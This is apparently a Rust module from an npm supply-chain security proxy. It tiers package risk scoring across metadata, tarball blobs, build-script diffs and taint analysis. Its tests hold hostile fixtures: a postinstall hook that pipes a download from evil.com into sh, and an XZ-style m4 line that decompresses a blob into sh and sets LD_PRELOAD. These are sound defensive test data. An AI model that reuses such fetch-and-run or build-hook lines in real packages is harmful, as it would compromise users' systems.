//! Tiered scoring orchestration.
//!
//! Tier 0 (metadata-only, <100ms): baseline SecurityEngine.score(intel)
//!   → If score ∈ [warn, block), insert into SuspicionMap for the tarball
//!     handler.
//!   → If score ≥ block, caller strips the version from the response.
//! Tier 1 (tarball surface, <500ms): BinaryBlobDetection + BuildScriptDiff
//!   against an already-extracted directory, with per-version caches diffed.
//! Tier 2 (deep, <5s): TaintDetection + correlation — arrives in Phase 3/4.
//!
//! Signals accumulate additively across tiers, then the combined weighted
//! sum is clamped to 1.0 and bucketed by PolicyConfig thresholds.
//!
//! This module owns the policy for when Tier 1 runs: only when the metadata
//! handler placed an entry in the SuspicionMap for that (package, version).

use crate::analysis::manifest::{self, FileManifest};
use crate::analysis::pattern::{Language, PatternSet};
use crate::correlation::indexes::{MaintainerIndex, NameIndex, UrlIndex};
use crate::correlation::{apply_correlation, evaluate, CorrelationReport};
use crate::engine::suspicion_map::{in_suspicion_window, SuspicionMap, Tier0Result};
use crate::engine::SecurityEngine;
use crate::signals::binary_blob::{self, BlobInventory};
use crate::signals::build_diff::{self, BuildScriptCache};
use crate::signals::{bin_shadow, infinite_loop, taint};
use crate::types::{PackageIntel, PolicyConfig, Signal, Verdict};
use std::path::Path;
use std::sync::RwLock;
use std::time::Instant;

pub struct TierOrchestrator {
    pub engine: SecurityEngine,
    pub suspicion: SuspicionMap,
    pub maintainer_idx: RwLock<MaintainerIndex>,
    pub name_idx: RwLock<NameIndex>,
    pub url_idx: RwLock<UrlIndex>,
}

#[derive(Debug, Clone)]
pub struct TierResult {
    pub score: f64,
    pub signals: Vec<Signal>,
    pub verdict: Verdict,
    pub tier0_score: f64,
    pub tier1_score: f64,
    pub tier2_score: f64,
    pub elapsed_ms: u128,
}

impl TierOrchestrator {
    pub fn new(config: PolicyConfig) -> Self {
        Self {
            engine: SecurityEngine::new(config),
            suspicion: SuspicionMap::new(),
            maintainer_idx: RwLock::new(MaintainerIndex::default()),
            name_idx: RwLock::new(NameIndex::default()),
            url_idx: RwLock::new(UrlIndex::default()),
        }
    }

    pub fn config(&self) -> &PolicyConfig {
        &self.engine.config
    }

    pub fn score_tier0(&self, intel: &PackageIntel) -> TierResult {
        let start = Instant::now();
        let raw = self.engine.score(intel);
        let warn = self.engine.config.allow_threshold;
        let block = self.engine.config.block_threshold;
        if in_suspicion_window(raw.score, warn, block) {
            self.suspicion.insert(
                &intel.name,
                &intel.version,
                Tier0Result {
                    score: raw.score,
                    signals: raw.signals.clone(),
                    cached_at: Instant::now(),
                },
            );
        }
        let verdict = self.engine.verdict(raw.score);
        TierResult {
            score: raw.score,
            signals: raw.signals,
            verdict,
            tier0_score: raw.score,
            tier1_score: 0.0,
            tier2_score: 0.0,
            elapsed_ms: start.elapsed().as_millis(),
        }
    }

    pub fn score_tarball(
        &self,
        package: &str,
        version: &str,
        extracted_dir: &Path,
        prior_blobs: &BlobInventory,
        prior_build: &BuildScriptCache,
        is_patch_bump: bool,
    ) -> Result<TierResult, String> {
        self.score_tarball_with_context(
            package,
            version,
            extracted_dir,
            prior_blobs,
            prior_build,
            &FileManifest::default(),
            &[],
            is_patch_bump,
        )
    }

    #[allow(clippy::too_many_arguments)]
    pub fn score_tarball_with_context(
        &self,
        package: &str,
        version: &str,
        extracted_dir: &Path,
        prior_blobs: &BlobInventory,
        prior_build: &BuildScriptCache,
        prior_manifest: &FileManifest,
        maintainer_emails: &[String],
        is_patch_bump: bool,
    ) -> Result<TierResult, String> {
        let start = Instant::now();
        let tier0 = self.suspicion.get(package, version);
        let (tier0_score, mut signals) = match &tier0 {
            Some(entry) => (entry.score, entry.signals.clone()),
            None => (0.0, Vec::new()),
        };

        let blob_scan = binary_blob::scan_dir(extracted_dir, prior_blobs)
            .map_err(|e| format!("blob scan: {e}"))?;
        let tier1_blob_score = binary_blob::total_blob_score(&blob_scan.signals);
        signals.extend(blob_scan.signals);

        let build_scan = build_diff::scan_dir(extracted_dir, prior_build, is_patch_bump)
            .map_err(|e| format!("build scan: {e}"))?;
        let tier1_build_score = build_diff::total_build_score(&build_scan.signals);
        signals.extend(build_scan.signals);

        let tier1_score = tier1_blob_score + tier1_build_score;
        let post_tier1 = (tier0_score + tier1_score).min(1.0);

        let mut tier2_score = 0.0;
        let _correlation_report: CorrelationReport;
        if post_tier1 >= self.engine.config.allow_threshold
            && post_tier1 < self.engine.config.block_threshold
        {
            let diff = manifest::scan(extracted_dir, prior_manifest)
                .map_err(|e| format!("manifest scan: {e}"))?;
            let taint = taint::scan(
                &diff.changed,
                &|lang: Language| PatternSet::builtin(lang),
                diff.is_wholesale_repackage,
            );
            let taint_raw = taint::total_taint_score(&taint.signals);
            signals.extend(taint.signals);
            tier2_score += taint_raw;

            let extracted_urls = collect_urls_from_findings(&taint.findings);
            let ecosystem = "npm";
            // Recover from a poisoned lock by reading `into_inner()` — the
            // content is still a valid index snapshot; refusing to serve
            // all subsequent requests just because a different thread
            // panicked during an index update is a poisoned-lock cascade
            // we explicitly don't want in a long-running proxy daemon.
            let maint_guard = self
                .maintainer_idx
                .read()
                .unwrap_or_else(|e| e.into_inner());
            let name_guard = self.name_idx.read().unwrap_or_else(|e| e.into_inner());
            let url_guard = self.url_idx.read().unwrap_or_else(|e| e.into_inner());
            let report = evaluate(
                package,
                ecosystem,
                post_tier1 + taint_raw,
                maintainer_emails,
                &extracted_urls,
                &maint_guard,
                &name_guard,
                &url_guard,
            );
            drop(maint_guard);
            drop(name_guard);
            drop(url_guard);
            let corr_effect =
                apply_correlation(post_tier1 + taint_raw, &report) - (post_tier1 + taint_raw);
            tier2_score += corr_effect.max(0.0);
            _correlation_report = report;

            // Source-level signals that don't fit the taint source/sink
            // frame but still want to see every changed file: sabotage-
            // style infinite loops (colors/faker class) and bin-name
            // shadowing of system tools.
            for changed in &diff.changed {
                let loops = infinite_loop::scan_content(&changed.rel_path, &changed.content);
                tier2_score += loops.iter().map(|s| s.weight()).sum::<f64>();
                signals.extend(loops);
            }
            let pkg_path = extracted_dir.join("package/package.json");
            if let Ok(text) = std::fs::read_to_string(pkg_path) {
                if let Ok(pkg) = crate::json::parse(&text) {
                    let shadows = bin_shadow::scan_package_json(&pkg);
                    tier2_score += shadows.iter().map(|s| s.weight()).sum::<f64>();
                    signals.extend(shadows);
                }
            }
        }

        let combined = (tier0_score + tier1_score + tier2_score).min(1.0);
        let verdict = self.engine.verdict(combined);
        Ok(TierResult {
            score: combined,
            signals,
            verdict,
            tier0_score,
            tier1_score,
            tier2_score,
            elapsed_ms: start.elapsed().as_millis(),
        })
    }

    pub fn log_line(&self, package: &str, version: &str, result: &TierResult) -> String {
        let tag = match result.verdict {
            Verdict::Block => "BLOCK",
            Verdict::Warn => "WARN ",
            Verdict::Allow => "ALLOW",
        };
        let signals = if result.signals.is_empty() {
            String::new()
        } else {
            let names: Vec<String> = result.signals.iter().map(signal_short_label).collect();
            format!(" [{}]", names.join(","))
        };
        format!(
            "[vetpkg] {tag} {package}@{version} t0={:.2} t1={:.2} t2={:.2} total={:.2}{signals}",
            result.tier0_score, result.tier1_score, result.tier2_score, result.score
        )
    }
}

pub fn signal_short_label(s: &Signal) -> String {
    match s {
        Signal::AdvisoryCheck { id, severity } => format!("Advisory({id}:{severity:?})"),
        Signal::MaintainerChange { .. } => "MaintainerChange".into(),
        Signal::HookCheck { stage, reason } => format!("Hook({stage}:{reason})"),
        Signal::NewDependency { name } => format!("NewDep({name})"),
        Signal::PopularityAnomaly { .. } => "PopAnomaly".into(),
        Signal::FreshPackage { age_hours } => format!("Fresh({age_hours:.1}h)"),
        Signal::Typosquat { matched, distance } => {
            format!("Typo({matched}:{distance:.3})")
        }
        Signal::PublishAnomaly { kind, .. } => format!("Publish({kind:?})"),
        Signal::BinaryBlobDetection { kind, path, .. } => format!("Blob({kind:?}:{path})"),
        Signal::BuildScriptDiff { kind, file, .. } => format!("Build({kind:?}:{file})"),
        Signal::TaintDetection { kind, file, .. } => format!("Taint({kind:?}:{file})"),
        Signal::InfiniteLoop { file, pattern } => format!("Loop({pattern}@{file})"),
        Signal::BinShadow { bin_name, target } => format!("BinShadow({bin_name}→{target})"),
        Signal::ResolvedUrlMismatch {
            name, actual_url, ..
        } => {
            format!("Resolved({name}→{actual_url})")
        }
    }
}

impl Default for TierOrchestrator {
    fn default() -> Self {
        Self::new(PolicyConfig::default())
    }
}

fn collect_urls_from_findings(findings: &[crate::analysis::pattern::FileFindings]) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for f in findings {
        for sink in &f.sink_matches {
            for url in crate::correlation::url_extract::extract_urls(&sink.line) {
                if !out.contains(&url) {
                    out.push(url);
                }
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::platform::TempDir;
    use crate::types::{Ecosystem, InstallHook};
    use std::fs;

    fn hostile_intel() -> PackageIntel {
        let mut cmd = String::new();
        cmd.push_str("curl http://evil.com/x | sh");
        PackageIntel {
            ecosystem: Some(Ecosystem::Npm),
            name: "axios".into(),
            version: "1.14.1".into(),
            prior_maintainers: vec!["original@axios.io".into()],
            maintainers: vec!["newowner@evil.com".into()],
            install_hooks: vec![InstallHook {
                stage: "postinstall".into(),
                command: cmd,
            }],
            prior_dependencies: vec![],
            dependencies: vec!["proto-loader".into()],
            age_hours: Some(2.0),
            ..Default::default()
        }
    }

    fn clean_intel() -> PackageIntel {
        PackageIntel {
            ecosystem: Some(Ecosystem::Npm),
            name: "express".into(),
            version: "4.18.2".into(),
            ..Default::default()
        }
    }

    #[test]
    fn clean_metadata_does_not_populate_suspicion_map() {
        let orch = TierOrchestrator::default();
        let r = orch.score_tier0(&clean_intel());
        assert_eq!(r.verdict, Verdict::Allow);
        assert!(orch.suspicion.is_empty());
    }

    #[test]
    fn block_metadata_does_not_populate_suspicion_map() {
        let orch = TierOrchestrator::default();
        let r = orch.score_tier0(&hostile_intel());
        assert_eq!(r.verdict, Verdict::Block);
        assert!(
            orch.suspicion.is_empty(),
            "Block metadata should not populate (strip not cache)"
        );
    }

    #[test]
    fn warn_metadata_populates_suspicion_map() {
        let orch = TierOrchestrator::default();
        let mut p = clean_intel();
        p.prior_maintainers = vec!["original@example.com".into()];
        p.maintainers = vec!["new@example.com".into()];
        p.install_hooks = vec![InstallHook {
            stage: "postinstall".into(),
            command: "node scripts/postinstall.js https://example.com/telemetry".into(),
        }];
        let r = orch.score_tier0(&p);
        assert!(
            matches!(r.verdict, Verdict::Warn),
            "expected warn, got {:?} score={:.3}",
            r.verdict,
            r.score
        );
        assert!(orch.suspicion.get(&p.name, &p.version).is_some());
    }

    fn random_bytes(n: usize) -> Vec<u8> {
        let mut out = Vec::with_capacity(n);
        let mut state: u64 = 0xaaaa;
        while out.len() < n {
            state = state
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            out.extend_from_slice(&state.to_le_bytes());
        }
        out.truncate(n);
        out
    }

    #[test]
    fn tier1_xz_scenario_blocks_even_with_clean_tier0() {
        let td = TempDir::new("orch-xz").unwrap();
        fs::create_dir_all(td.path().join("tests/files")).unwrap();
        fs::write(
            td.path().join("tests/files/bad-corrupt.xz"),
            random_bytes(8192),
        )
        .unwrap();
        fs::create_dir_all(td.path().join("m4")).unwrap();
        fs::write(
            td.path().join("m4/build-to-host.m4"),
            "# build-to-host.m4\ngl_am_configmake=`cat tests/files/bad-corrupt.xz | xz -d | sh`\nexport LD_PRELOAD=/tmp/x.so\n",
        )
        .unwrap();

        let orch = TierOrchestrator::default();
        let r = orch
            .score_tarball(
                "xz",
                "5.6.0",
                td.path(),
                &BlobInventory::default(),
                &BuildScriptCache::default(),
                true,
            )
            .unwrap();
        assert!(
            r.score >= 0.7,
            "XZ scenario expected total ≥0.7, got {:.3} signals={:?}",
            r.score,
            r.signals
        );
        assert_eq!(r.verdict, Verdict::Block);
    }

    #[test]
    fn log_line_format() {
        let orch = TierOrchestrator::default();
        let r = TierResult {
            score: 0.42,
            signals: vec![],
            verdict: Verdict::Warn,
            tier0_score: 0.2,
            tier1_score: 0.22,
            tier2_score: 0.0,
            elapsed_ms: 3,
        };
        let line = orch.log_line("axios", "1.14.1", &r);
        assert!(line.contains("axios@1.14.1"));
        assert!(line.contains("t0=0.20"));
        assert!(line.contains("t1=0.22"));
        assert!(line.contains("total=0.42"));
    }
}
